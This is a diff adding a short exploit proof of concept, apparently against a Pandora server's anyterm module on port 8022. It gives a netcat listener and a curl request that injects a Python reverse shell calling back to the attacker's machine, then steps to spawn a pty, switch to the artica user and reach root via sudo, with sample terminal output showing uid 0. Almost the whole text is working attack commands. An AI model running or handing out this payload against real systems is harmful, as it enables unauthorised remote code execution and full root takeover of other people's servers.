@@ -1,0 +1,33 @@
+# Open a linux/osx terminal and run a netcat listener like this:
+
+nc -vl 8888
+
+# Execute the following curl command, replace "123.123.123.123" with the IP
+of the Pandora server and "321.321.321.321" with the machine running netcat.
+curl -i -s -k  -X 'POST' \
+    -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+    --data-binary $'a=open&p=%60python -c \'import
+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"321.321.321.321\",8888));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);\'%60' \
+    'http://123.123.123.123:8022/anyterm-module'
+
+
+# In the netcat shell you'll receive a shell as user "pandora". Use the
+following command to spawn a pty: python -c 'import
+pty;pty.spawn("/bin/bash")'
+# Change user to artica by doing a "su - artica". From here do a "sudo -s"
+to gain a root shell. Below is how it should look like.
+
+$ nc -vl 8888
+python -c 'import pty;pty.spawn("/bin/bash")'
+bash-4.1$ su - artica
+su - artica
+-bash-4.1$ id
+id
+uid=501(artica) gid=501(artica) groups=501(artica)
+-bash-4.1$ sudo -s
+sudo -s
+[root@localhost artica]# id
+id
+uid=0(root) gid=0(root) groups=0(root)
